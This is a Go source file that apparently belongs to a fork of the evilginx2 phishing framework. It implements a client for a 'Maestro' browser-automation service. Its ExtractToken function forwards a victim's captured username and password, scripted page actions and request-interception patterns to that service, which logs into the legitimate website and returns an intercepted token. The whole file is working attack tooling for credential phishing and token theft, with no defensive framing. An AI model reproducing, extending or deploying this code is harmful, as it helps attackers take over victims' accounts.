package core

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"time"

	"github.com/kgretzky/evilginx2/log"
)

const (
	DEFAULT_MAESTRO_ENDPOINT = "http://localhost:8080"
	MAESTRO_TIMEOUT          = 60 * time.Second
)

type MaestroClient struct {
	endpoint   string
	httpClient *http.Client
}

type MaestroStartSessionRequest struct {
	SessionID string `json:"sessionId"`
}

type MaestroStartSessionResponse struct {
	SessionID string `json:"sessionId"`
	Status    string `json:"status"`
}

type MaestroExtractTokenRequest struct {
	OpenURL     string                     `json:"openUrl"`
	Username    string                     `json:"username"`
	Password    string                     `json:"password"`
	Actions     []MaestroAction            `json:"actions"`
	Interceptor MaestroInterceptorConfig   `json:"interceptor"`
}

type MaestroAction struct {
	Selector string `json:"selector"`
	Value    string `json:"value,omitempty"`
	Click    bool   `json:"click,omitempty"`
	PostWait int    `json:"post_wait,omitempty"`
}

type MaestroInterceptorConfig struct {
	Token  string `json:"token"`
	UrlRe  string `json:"url_re"`
	PostRe string `json:"post_re"`
	Abort  bool   `json:"abort"`
}

type MaestroExtractTokenResponse struct {
	SessionID string `json:"sessionId"`
	Token     string `json:"token"`
	Status    string `json:"status"`
}

type MaestroCloseSessionResponse struct {
	SessionID string `json:"sessionId"`
	Status    string `json:"status"`
}

type MaestroHealthResponse struct {
	Status         string  `json:"status"`
	ActiveSessions int     `json:"activeSessions"`
	Uptime         float64 `json:"uptime"`
}

type MaestroErrorResponse struct {
	Error string `json:"error"`
}

func NewMaestroClient(endpoint string) *MaestroClient {
	if endpoint == "" {
		endpoint = DEFAULT_MAESTRO_ENDPOINT
	}

	return &MaestroClient{
		endpoint: endpoint,
		httpClient: &http.Client{
			Timeout: MAESTRO_TIMEOUT,
		},
	}
}

// HealthCheck checks if Maestro service is available
func (m *MaestroClient) HealthCheck() error {
	url := fmt.Sprintf("%s/health", m.endpoint)

	resp, err := m.httpClient.Get(url)
	if err != nil {
		return fmt.Errorf("maestro health check failed: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("maestro health check failed: status %d", resp.StatusCode)
	}

	var healthResp MaestroHealthResponse
	if err := json.NewDecoder(resp.Body).Decode(&healthResp); err != nil {
		return fmt.Errorf("failed to decode health response: %v", err)
	}

	if healthResp.Status != "ok" {
		return fmt.Errorf("maestro is not healthy: %s", healthResp.Status)
	}

	log.Debug("maestro health check passed: %d active sessions, uptime %.2fs",
		healthResp.ActiveSessions, healthResp.Uptime)

	return nil
}

// StartSession starts a new browser session
func (m *MaestroClient) StartSession(sessionID string) error {
	url := fmt.Sprintf("%s/session/start", m.endpoint)

	reqBody := MaestroStartSessionRequest{
		SessionID: sessionID,
	}

	jsonData, err := json.Marshal(reqBody)
	if err != nil {
		return fmt.Errorf("failed to marshal request: %v", err)
	}

	resp, err := m.httpClient.Post(url, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		return fmt.Errorf("failed to start maestro session: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		var errResp MaestroErrorResponse
		if err := json.NewDecoder(resp.Body).Decode(&errResp); err == nil {
			return fmt.Errorf("maestro session start failed: %s", errResp.Error)
		}
		return fmt.Errorf("maestro session start failed: status %d", resp.StatusCode)
	}

	log.Debug("maestro session started: %s", sessionID)
	return nil
}

// ExtractToken extracts token from legitimate website
func (m *MaestroClient) ExtractToken(sessionID string, trigger *maestroTrigger, interceptor *maestroInterceptor, username string, password string) (string, error) {
	url := fmt.Sprintf("%s/session/%s/extract-token", m.endpoint, sessionID)

	// Convert actions to Maestro format
	actions := make([]MaestroAction, len(trigger.actions))
	for i, action := range trigger.actions {
		actions[i] = MaestroAction{
			Selector: action.selector,
			Value:    action.value,
			Click:    action.click,
			PostWait: action.post_wait,
		}
	}

	reqBody := MaestroExtractTokenRequest{
		OpenURL:  trigger.open_url,
		Username: username,
		Password: password,
		Actions:  actions,
		Interceptor: MaestroInterceptorConfig{
			Token:  interceptor.token,
			UrlRe:  interceptor.url_re.String(),
			PostRe: interceptor.post_re.String(),
			Abort:  interceptor.abort,
		},
	}

	jsonData, err := json.Marshal(reqBody)
	if err != nil {
		return "", fmt.Errorf("failed to marshal request: %v", err)
	}

	log.Debug("maestro extracting token for session: %s", sessionID)

	resp, err := m.httpClient.Post(url, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		return "", fmt.Errorf("failed to extract token: %v", err)
	}
	defer resp.Body.Close()

	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", fmt.Errorf("failed to read response body: %v", err)
	}

	if resp.StatusCode != http.StatusOK {
		var errResp MaestroErrorResponse
		if err := json.Unmarshal(bodyBytes, &errResp); err == nil {
			return "", fmt.Errorf("token extraction failed: %s", errResp.Error)
		}
		return "", fmt.Errorf("token extraction failed: status %d", resp.StatusCode)
	}

	var extractResp MaestroExtractTokenResponse
	if err := json.Unmarshal(bodyBytes, &extractResp); err != nil {
		return "", fmt.Errorf("failed to decode response: %v", err)
	}

	if extractResp.Token == "" {
		return "", fmt.Errorf("empty token received")
	}

	log.Info("maestro token extracted successfully for session: %s (token length: %d)", sessionID, len(extractResp.Token))
	return extractResp.Token, nil
}

// CloseSession closes a browser session
func (m *MaestroClient) CloseSession(sessionID string) error {
	url := fmt.Sprintf("%s/session/%s", m.endpoint, sessionID)

	req, err := http.NewRequest(http.MethodDelete, url, nil)
	if err != nil {
		return fmt.Errorf("failed to create request: %v", err)
	}

	resp, err := m.httpClient.Do(req)
	if err != nil {
		return fmt.Errorf("failed to close session: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK && resp.StatusCode != http.StatusNotFound {
		var errResp MaestroErrorResponse
		if err := json.NewDecoder(resp.Body).Decode(&errResp); err == nil {
			return fmt.Errorf("session close failed: %s", errResp.Error)
		}
		return fmt.Errorf("session close failed: status %d", resp.StatusCode)
	}

	log.Debug("maestro session closed: %s", sessionID)
	return nil
}
